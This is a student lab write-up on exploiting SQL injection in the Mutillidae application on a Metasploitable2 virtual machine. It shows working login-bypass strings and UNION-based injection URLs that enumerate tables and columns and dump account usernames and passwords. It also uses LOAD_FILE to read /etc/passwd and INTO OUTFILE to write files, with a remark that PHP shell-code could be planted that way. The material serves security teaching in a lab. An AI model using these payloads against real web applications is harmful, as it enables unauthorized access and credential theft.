# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/vatsan143/sqlinjection/assets/147368204/c2e05d66-df2b-4ef7-8fd2-f3002abb26a1)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/0a898a18-df64-4abc-ad46-1f0f663678f3)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/vatsan143/sqlinjection/assets/147368204/26c0f6fc-9218-404d-9b85-47314d521d7e)
Click on the menu Login/Register and register for an account


![image](https://github.com/vatsan143/sqlinjection/assets/147368204/8ce7c58e-07c4-4c43-88de-1e86251ec476)

Click on the link “Please register here”
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/054e6aa8-49e1-49ec-a306-e1c5f6eb4d93)

Click on “Create Account” to display the following page:
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/c1971771-7d2c-42ce-a3f9-40dff2c48bb7)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.


![image](https://github.com/vatsan143/sqlinjection/assets/147368204/74d290e7-6354-40a8-a81c-609dfcce7fcc)

Click “Login”. The logged in page will show as below:
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/950b1693-5d5a-4422-b51c-f16f99cdb0c8)



##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![image](https://github.com/vatsan143/sqlinjection/assets/147368204/c812b27e-be80-42d7-be80-1fe8af8d12ac)

Click the login button and you will see it enter into the administrator page.
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/65491c0b-83b8-4995-8fec-1e25f3d70cc6)


## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/a4d4ca02-da45-4bd3-b0a0-74b45d406953)
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/54e4dcbb-3d47-4872-a57b-f3bf9702c737)


![image](https://github.com/vatsan143/sqlinjection/assets/147368204/a294ec74-475b-428c-ba55-30b284f3588f)

![image](https://github.com/vatsan143/sqlinjection/assets/147368204/8fa94954-fbd5-4db5-a508-528c3858902d)

![image](https://github.com/vatsan143/sqlinjection/assets/147368204/17ba96ee-ba64-4f56-a9b4-a8ad18978af0)

![image](https://github.com/vatsan143/sqlinjection/assets/147368204/eb37a873-3353-436e-b966-828ca8afa570)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/18f07c2a-81ab-48aa-b205-01c29c1498df)


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=vatsan%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details


![image](https://github.com/vatsan143/sqlinjection/assets/147368204/3fab5188-592a-4a9f-8420-824f73fc928a)

After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/b3e02c12-53ad-4043-be4d-7038eb216687)



When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/d696d4cb-9f7c-4a2f-bd7f-2c1e4c704f68)


 As it is having 5 columns the query worked fine and it provides the correct result


![image](https://github.com/vatsan143/sqlinjection/assets/147368204/e2423848-e9f1-4af6-99ce-e4c3c94be547)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/vatsan143/sqlinjection/assets/147368204/54e02b5c-2c69-48a7-ab65-65bdba463307)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/7079a658-8985-4a79-b6ce-fc9fc82ab461)
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=vatsan%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details



![image](https://github.com/vatsan143/sqlinjection/assets/147368204/aa264de1-ed65-498d-96fd-98da9d720b16)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=vatsan%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/vatsan143/sqlinjection/assets/147368204/6cccd0b2-1c0a-41a3-b336-e9566552a16b)

The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.




![image](https://github.com/vatsan143/sqlinjection/assets/147368204/3c0a95ee-3e4f-4c21-8200-508da5695912)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=vatsan%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![image](https://github.com/vatsan143/sqlinjection/assets/147368204/dc814aee-0377-4b38-95e6-5380e614206d)





Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=vatsan%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/vatsan143/sqlinjection/assets/147368204/f0b4dcf7-8f05-4e6f-8c8c-f70a546233c8)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=vatsan%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/ab2194fc-313b-45db-91a4-090c40831ac8)
![image](https://github.com/vatsan143/sqlinjection/assets/147368204/96787dae-0313-4b78-804a-4e6be028a9a8)


the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
